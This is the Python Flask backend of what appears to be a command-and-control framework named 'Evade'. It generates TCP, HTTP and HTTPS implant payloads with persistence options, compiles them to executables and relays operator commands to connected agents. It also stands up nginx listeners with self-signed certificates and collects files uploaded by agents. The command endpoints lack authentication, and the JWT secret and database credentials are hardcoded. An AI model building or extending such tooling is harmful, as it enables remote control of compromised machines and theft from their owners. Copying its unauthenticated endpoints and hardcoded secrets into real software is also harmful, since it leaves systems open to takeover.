from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from string import Template
import re
import subprocess
import uuid
import os
import logging
import threading
from flask_socketio import SocketIO, emit
import socket
import json
from werkzeug.security import check_password_hash, generate_password_hash
from werkzeug.utils import secure_filename
from flask_jwt_extended import JWTManager, create_access_token, jwt_required, get_jwt_identity
from dotenv import load_dotenv

from agent_templates import tcp_agent_template, http_agent_template, https_agent_template
from Servers.tcp.tcp_server import start_tcp_server
from database import init_db,db,Agent,Session,User,Command
import requests

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="http://localhost:3000")

load_dotenv()

# Define the path to the uploads folder
UPLOADS_FOLDER = os.path.join(app.root_path, 'uploads')
app.config['UPLOADS_FOLDER'] = UPLOADS_FOLDER

# Ensure the uploads folder exists
os.makedirs(UPLOADS_FOLDER, exist_ok=True)

app.config['JWT_SECRET_KEY'] = 'your_jwt_secret_key'
jwt = JWTManager(app)

CORS(app, supports_credentials=True, origins='http://localhost:3000')

app.config['UPLOAD_FOLDER'] = r"E:\\Github\\Repos\\Evade-A-C2-Framework\\COMPELTE\\generated_payloads"
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://postgres:postgres@127.0.0.1:5432/evade-c2'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

init_db(app)

# Static users dictionary
users = {'rochak': generate_password_hash('rochak')}

@app.route('/api/login', methods=['POST'])
def login():
    username = request.json.get('username')
    password = request.json.get('password')
    user = User.query.filter_by(username=username).first()
    
    if user and check_password_hash(user.password_hash, password):
        access_token = create_access_token(identity=username)
        return jsonify(access_token=access_token), 200
    else:
        return jsonify({'message': 'Invalid credentials'}), 401


@app.route('/api/logout', methods=['POST'])
@jwt_required()
def logout():
    # JWT logout is handled client-side by removing the token, so this is just a placeholder
    return jsonify({'message': 'User logged out successfully'}), 200

@app.route('/api/check_login', methods=['GET'])
@jwt_required()
def check_login():
    current_user = get_jwt_identity()
    if current_user:
        return jsonify({'logged_in': True, 'user': current_user}), 200
    return jsonify({'logged_in': False}), 401

def create_update_default_admin():
    with app.app_context():
        admin_username = os.environ.get('DEFAULT_ADMIN_USERNAME')
        admin_password = os.environ.get('DEFAULT_ADMIN_PASSWORD')
        admin_user = User.query.filter_by(username=admin_username).first()
        
        if not admin_user:
            # If the admin doesn't exist, create them
            admin_user = User(username=admin_username, password_hash=generate_password_hash(admin_password))
            db.session.add(admin_user)
        else:
            # Optionally, update the existing admin password
            admin_user.password_hash = generate_password_hash(admin_password)
        db.session.commit()

create_update_default_admin()

@app.route('/api/execute-command/TCP', methods=['POST'])
def execute_command():
    data = request.get_json()
    agent_id = data.get('agentId')
    command = data.get('command')
    #If the command received is shutdown 

    # Connect to your TCP server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(('127.0.0.1', 62347))
        # Send agent_id and command in a structured format
        message = json.dumps({'agent_id': agent_id, 'command': command})
        s.sendall(message.encode('utf-8'))

        # Wait for acknowledgment or response from the TCP server
        response = s.recv(4092).decode('utf-8')
        print("------------------------------------")
        print(f'Received: {response}')
        print("------------------------------------")

    return jsonify({'status': 'Command sent to TCP server', 'response': response}), 200

@app.route('/api/execute-command/HTTP', methods=['POST'])
def execute_command_http():
    data = request.get_json()  # Get data from the incoming request
    agent_id = data.get('agentId')  # Use lower case for JSON keys
    command = data.get('command')
    print(data)
    if not agent_id or not command:
        return jsonify({'error': 'Missing required fields: agent_id or command'}), 400

    # Prepare data for the outgoing request
    endpoint = "http://127.0.0.1:5678/send_command"
    headers = {'Content-Type': 'application/json'}

    try:
        response = requests.post(endpoint, json=data, headers=headers)
        print(f"Data sent to {endpoint}: {data}")
        print(f"Response from server: {response.text}")
        return jsonify({'message': 'Data sent successfully', 'response':'Executed successfully'}), 200
    except requests.exceptions.RequestException as e:
        print(f"Failed to send data: {str(e)}")
        return jsonify({'error': 'Failed to communicate with command server'}), 500


@app.route('/api/execute-command/HTTPS', methods=['POST'])
def execute_command_https():
    # Specific logic for handling HTTPS commands
    pass

# Flask route to handle file uploads in your backend
@app.route('/upload', methods=['POST'])
def upload_file():
    agent_id = request.form['agent_id']
    file = request.files.get('file')
    if file:
        filename = secure_filename(file.filename)
        # You might want to organize uploads by agent ID
        agent_upload_folder = os.path.join(app.config['UPLOADS_FOLDER'], agent_id)
        os.makedirs(agent_upload_folder, exist_ok=True)
        
        file_path = os.path.join(agent_upload_folder, filename)
        file.save(file_path)
        
        return jsonify({'message': f'File {filename} uploaded successfully.'})
    else:
        return jsonify({'error': 'No file provided'}), 400

@app.route('/list_files/<agent_id>', methods=['GET'])
def list_files(agent_id):
    agent_upload_folder = os.path.join(app.config['UPLOADS_FOLDER'], agent_id)
    if os.path.isdir(agent_upload_folder):
        files = os.listdir(agent_upload_folder)
        return jsonify({'files': files})
    else:
        return jsonify({'error': 'Agent not found'}), 404

@app.route('/api/configure-listener', methods=['POST'])
def configure_listener():
    data = request.get_json()
    protocol = data.get('protocol')
    port = int(data.get('port'))
    localIP = data.get('localIP')
    if not protocol or not port:
        return jsonify({'error': 'Missing required fields'}), 400

    print(data)
    
    nginx_conf_path = r'D:\nginx\nginx-1.22.1\conf\nginx.conf'
    nginx_exe_path = r'D:\nginx\nginx-1.22.1\nginx.exe'
    nginx_dir = r'D:\nginx\nginx-1.22.1'

    if protocol.lower() == 'tcp':
        # Check if the port is already in use
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind((localIP, port))
        except OSError:
            return jsonify({'error': f'TCP port {port} is already in use'}), 400

        try:
            thread = threading.Thread(target=start_tcp_server, args=(localIP, port))
            thread.daemon = True
            thread.start()
            return jsonify({'message': 'TCP server started'}), 200
        except Exception as e:
            return jsonify({'error': f'Failed to start TCP listener: {str(e)}'}), 500

    elif protocol.lower() == 'http':
    
       # Load the template
        template_path = r'E:\Github\Repos\Evade-A-C2-Framework\COMPELTE\back-end\payload\Servers\http\nginx_http.conf.template'
        with open(template_path, 'r') as file:
            template_content = Template(file.read())

        # Substitute the placeholders with actual values using the substitute method
        server_block = template_content.substitute(PORT=str(port), SERVER_NAME=localIP)

        try:
            # Read the current nginx.conf
            with open(nginx_conf_path, 'r') as file:
                nginx_config = file.read()

            # Check if the specific server block already exists
            pattern = rf'server\s*{{.*?listen\s+{port};.*?server_name\s+{localIP};.*?}}'
            match = re.search(pattern, nginx_config, re.DOTALL)
            if match:
                return jsonify({'message': f'HTTP server already configured for {localIP}:{port}'}), 200
            else:
                # Append the new server block directly under the http context
                insertion_point = nginx_config.rfind('}')
                nginx_config = nginx_config[:insertion_point] + '\n' + server_block + nginx_config[insertion_point:]

                # Write the updated config back to nginx.conf
                with open(nginx_conf_path, 'w') as file:
                    file.write(nginx_config)

                # Reload Nginx to apply changes
                subprocess.run([nginx_exe_path, '-s', 'reload'], check=True, cwd=nginx_dir)
                return jsonify({'message': f'HTTP server configured on {localIP}:{port}'}), 200

        except Exception as error:
            print(f"Error updating Nginx configuration for HTTP: {error}")
            return jsonify({'error': 'Failed to update Nginx configuration for HTTP'}), 500

    elif protocol.lower() == 'https':
        ip_sanitized = localIP.replace(".", "_")  # Sanitize the IP address for file naming
        cert_dir = os.path.join(r'E:\Github\Repos\Evade-A-C2-Framework\COMPELTE\back-end\payload\Servers\https\certs', ip_sanitized)
        openssl_path = r'E:\GIT\Git\usr\bin\openssl.exe'
        cnf_template_path = r'E:\Github\Repos\Evade-A-C2-Framework\COMPELTE\back-end\payload\Servers\https\openssl_template\openssl.cnf.template'
        template_path = r'E:\Github\Repos\Evade-A-C2-Framework\COMPELTE\back-end\payload\Servers\https\nginx_https.conf.template'
        nginx_conf_path = r'D:\nginx\nginx-1.22.1\conf\nginx.conf'

        # Ensure the certs directory exists
        os.makedirs(cert_dir, exist_ok=True)

        ssl_cert_path = os.path.join(cert_dir, f'{ip_sanitized}_server.crt')
        ssl_key_path = os.path.join(cert_dir, f'{ip_sanitized}_server.key')
        if os.path.exists(ssl_cert_path) and os.path.exists(ssl_key_path):
            ssl_exists = True
        else:
            ssl_exists = False
        try:
            if not ssl_exists:
            # OpenSSL Config
                with open(cnf_template_path, 'r') as file:
                    cnf_template = Template(file.read())
                cnf_content = cnf_template.substitute(USER_IP=localIP)
                cnf_output_path = os.path.join(cert_dir, 'openssl.cnf')
                with open(cnf_output_path, 'w') as file:
                    file.write(cnf_content)

                # SSL Generation
                subprocess.run([
                    openssl_path, 'req', '-newkey', 'rsa:2048', '-nodes',
                    '-keyout', os.path.join(cert_dir, 'server.key'), '-x509', '-days', '365',
                    '-out', os.path.join(cert_dir, 'server.crt'),
                    '-config', cnf_output_path, '-extensions', 'req_ext'
                ], check=True)

            # Nginx HTTPS Server Block
            with open(template_path, 'r') as file:
                server_block_template = Template(file.read())
            ssl_cert_path = os.path.join(cert_dir, 'server.crt').replace('\\', '/')
            ssl_key_path = os.path.join(cert_dir, 'server.key').replace('\\', '/')
            server_block = server_block_template.substitute(PORT=port, SERVER_NAME=localIP, SSL_CERT=ssl_cert_path, SSL_KEY=ssl_key_path)

            # Read the current nginx.conf and insert the new HTTPS server block
            with open(nginx_conf_path, 'r') as file:
                nginx_config = file.read()
                pattern = rf'server\s*\{{.*?listen\s+{port}.*?server_name\s+{localIP}.*?\}}'
                if re.search(pattern, nginx_config, re.DOTALL):
                    return jsonify({'message': f'Server block for {localIP}:{port} already configured.'}), 200
                else:
                    # Insert the server block correctly within the http context
                    http_context_end = nginx_config.rfind("}")  # Assuming the last '}' is the end of the http context
                    new_nginx_config = nginx_config[:http_context_end] + "\n" + server_block + "\n" + nginx_config[http_context_end:]

                    # Write the updated nginx config back to the file
                    with open(nginx_conf_path, 'w') as file:
                        file.write(new_nginx_config)

                    # Reload Nginx
                    subprocess.run([nginx_exe_path, '-s', 'reload'], check=True, cwd=nginx_dir)
                    return jsonify({'message': f'HTTPS server configured on {localIP}:{port} with SSL'}), 200

        except Exception as error:
            print(f"Error configuring HTTPS: {error}")
            return jsonify({'error': str(error)}), 500

@app.route('/api/remove-listener', methods=['POST'])
def remove_listener():
    data = request.get_json()
    protocol = data.get('protocol').lower()
    ip_address = data['localIP']
    port = data['port']
    nginx_conf_path = r'D:\nginx\nginx-1.22.1\conf\nginx.conf'
    nginx_exe_path = r'D:\nginx\nginx-1.22.1\nginx.exe'
    nginx_dir = r'D:\nginx\nginx-1.22.1'

    # Construct the pattern to find the comment and its server block
    comment_pattern = fr"\s*#\[{protocol.upper()}\|{ip_address}\|{port}\]\s*"
    server_block_pattern = fr"server\s*\{{(?:[^}}]|\}}(?!\}}))*\}}"
    combined_pattern = comment_pattern + server_block_pattern

    try:
        with open(nginx_conf_path, 'r') as file:
            nginx_config = file.read()

        # Find and remove the server block with its comment
        new_config, num_replacements = re.subn(combined_pattern, '', nginx_config, flags=re.DOTALL)

        if num_replacements == 0:
            return jsonify({'message': 'No matching listener found to remove'}), 404

        # Write the updated configuration back to the nginx.conf
        with open(nginx_conf_path, 'w') as file:
            file.write(new_config+"\n}\n")

        # Reload Nginx to apply the changes
        subprocess.run([nginx_exe_path, '-s', 'reload'], check=True, cwd=nginx_dir)
        return jsonify({'message': 'Listener removed successfully'}), 200

    except Exception as e:
        return jsonify({'error': f'Failed to remove listener: {str(e)}'}), 500
    
@app.route('/download/<filename>')
def download_payload(filename):
    try:
        # Log the requested filename for download
        print(f"Requested filename for download: {filename}")

        # Securely join the filename to the uploads folder
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        print(f"Constructed filepath: {filepath}")

        # Check if the file exists
        if not os.path.exists(filepath):
            print(f"File not found: {filepath}")  # Changed to print for visibility in console
            return jsonify({"error": "File not found"}), 404

        # Print the directory and filename being sent
        print(f"Sending file from directory: {app.config['UPLOAD_FOLDER']} with filename: {filename}")

        # Use send_from_directory with the corrected parameters
        return send_from_directory(directory=app.config['UPLOAD_FOLDER'], path=filename, as_attachment=True)
    except Exception as e:
        # Print the exception if the file download fails
        print("Failed to download file:", e)
        return jsonify({"error": "Internal server error"}), 500

@app.route('/api/generate-payload', methods=['POST'])
def generate_payload():
    data = request.get_json()
    agent_id=str(uuid.uuid4())
    print(agent_id)
    print(data)
    required_fields = ["name", "lhost", "lport", "type", "protocol", "persistence"]
    if not all(field in data for field in required_fields):
        return jsonify({"error": "Missing required fields"}), 400
    # Extract parameters
    name, lhost, lport, payload_type, protocol, persistence = (
        data["name"], data["lhost"], data["lport"], data["type"], data["protocol"], data["persistence"]
    )

    userAgent = data.get("userAgent", "")
    sleepTimer = data.get("sleepTimer", "")

    # Choose the appropriate template function and prepare parameters
    if protocol == "tcp":
        agent_code = tcp_agent_template(lhost=lhost, lport=lport, persistence=persistence,agent_id=agent_id)
        # write into database about the agent
        # Prepare extra data for storage
        extra_data = {
            "name": name,
            "lhost": lhost,
            "lport": lport,
            "type": payload_type,
            "persistence": persistence,
            "userAgent": userAgent,
            "sleepTimer": sleepTimer
        }

        # Initialize a new Agent object with the data
        new_agent = Agent(
            agent_id=agent_id,
            protocol=protocol,
            extra_data=extra_data  # Storing extra data as JSON
        )

        # Add the new agent to the session and commit to save it to the database
        db.session.add(new_agent)
        db.session.commit()

    elif protocol == "http":
        try:
            print(f"Handling {protocol.upper()} protocol")
            print(f"User-Agent: {data.get('userAgent', 'Not provided')}, Sleep Timer: {data.get('sleepTimer', 'Not provided')}")
            
            if not all(param in data for param in ["userAgent", "sleepTimer"]):
                return jsonify({"error": "Missing required HTTP fields"}), 400
            print("----------------------------------------------")
            print("Sabai chha data haru")
            print("----------------------------------------------")
            # Use the HTTP agent template function
            agent_code = http_agent_template(
                lhost=lhost, 
                lport=lport, 
                persistence=persistence, 
                userAgent=userAgent, 
                sleepTimer=sleepTimer,
                agent_id=agent_id
            )
            # Prepare extra data for storage
            extra_data = {
                "name": name,
                "lhost": lhost,
                "lport": lport,
                "type": payload_type,
                "persistence": persistence,
                "userAgent": userAgent,
                "sleepTimer": sleepTimer
            }
                # Initialize a new Agent object with the data
            new_agent = Agent(
                agent_id=agent_id,
                protocol=protocol,
                extra_data=extra_data  # Storing extra data as JSON
            )

            # Add the new agent to the session and commit to save it to the database
            db.session.add(new_agent)
            db.session.commit()

            print(agent_code)
        except Exception as e:
            # Log the exception or print for debugging
            print(f"Error generating HTTP agent: {e}")
            # Return a response indicating an internal error occurred
            return jsonify({"error": "An error occurred while generating the HTTP agent", "details": str(e)}), 500

    elif protocol == "https":
        print(f"Handling {protocol.upper()} protocol")
        print(f"User-Agent: {data.get('userAgent', 'Not provided')}, Sleep Timer: {data.get('sleepTimer', 'Not provided')}")
        
        if not all(param in data for param in ["userAgent", "sleepTimer"]):
            return jsonify({"error": "Missing required HTTPS fields"}), 400

        # Use the HTTPS agent template function
        agent_code = https_agent_template(
            lhost=lhost, 
            lport=lport, 
            persistence=persistence, 
            userAgent=data['userAgent'], 
            sleepTimer=data['sleepTimer'],
            agent_id=agent_id
        )
        extra_data = {
                "name": name,
                "lhost": lhost,
                "lport": lport,
                "type": payload_type,
                "persistence": persistence,
                "userAgent": userAgent,
                "sleepTimer": sleepTimer
            }

        # Initialize a new Agent object with the data
        new_agent = Agent(
            agent_id=agent_id,
            protocol=protocol,
            extra_data=extra_data  # Storing extra data as JSON
        )
        # Add the new agent to the session and commit to save it to the database
        db.session.add(new_agent)
        db.session.commit()

    else:
        return jsonify({"error": "Invalid protocol specified"}), 400

    print("----------------------------------------------")
    print("Filename ma pugyo")
    print("----------------------------------------------")
    # Save the generated code to a file
    filename = f"{name}_{str(uuid.uuid4())}{'.py' if payload_type == '.py' else '.exe'}"
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    with open(filepath, 'w') as file:
        file.write(agent_code)

    # Compile to .exe if needed
    if payload_type == '.exe':
        try:
            subprocess.run(['pyinstaller', '--onefile', '--distpath', app.config['UPLOAD_FOLDER'], '--name', filename, filepath], check=True)
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to compile .exe file: {e}")
            return jsonify({"error": "Failed to compile .exe file"}), 500

    download_url = f"http://{request.host}/download/{filename}"
    return jsonify({"message": "Payload generated successfully", "downloadUrl": download_url})

@socketio.on('connect')
def handle_connect():
    print("Client connected")
    # Optionally, you can emit a message back to the newly connected client
    emit('connection_status', {'message': 'Successfully connected to the server'})

def notify_frontend(agent_id, agent_name=None, addr=None):
    """Function to notify the frontend about an agent's status, including the agent's name, type, and address."""
    with app.app_context():
        session = Session()
        agent = session.query(Agent).filter_by(agent_id=agent_id).first()
        if agent:
            # Constructing a detailed message for logging
            #agent_info = f"Agent Data: ID={agent.agent_id}, Name={agent_name or 'Unknown'}, Type={agent.type}, Protocol={agent.protocol}, Last Seen={agent.last_seen}, Address={addr or 'Unknown'}"
            #print(agent_info)
            print("-------------------------------------------------------")
            print("EMIT EMIT")
            print("-------------------------------------------------------")
            # Emitting an update to the frontend with comprehensive agent details
            socketio.emit('agent_update', {
                'agent_id': agent.agent_id,
                'agent_name': agent_name or 'Unknown',
                'protocol': agent.protocol.upper(),
                'last_seen': agent.last_seen.strftime('%Y-%m-%d %H:%M:%S'),
                'address': addr or 'Unknown'  # Include address in the emitted data
            })
        session.close()

@app.route('/api/notify-agent-connection', methods=['POST'])
def notify_agent_connection():
    data = request.json
    agent_id = data.get('agent_id')
    agent_name = data.get('agent_name')  # Retrieve agent's name from the request data
    addr = data.get('addr')  # Retrieve address from the request data

    if agent_id:
        # Pass agent_id, agent_name, and address to the notify_frontend function
        notify_frontend(agent_id, agent_name, addr)
        return jsonify({'status': 'success', 'agent_name': agent_name}), 200
    return jsonify({'error': 'Missing agent_id'}), 400

if __name__ == "__main__":
    #app.run(debug=True, port=5002)
    socketio.run(app,debug=True, port=5002,allow_unsafe_werkzeug=True)
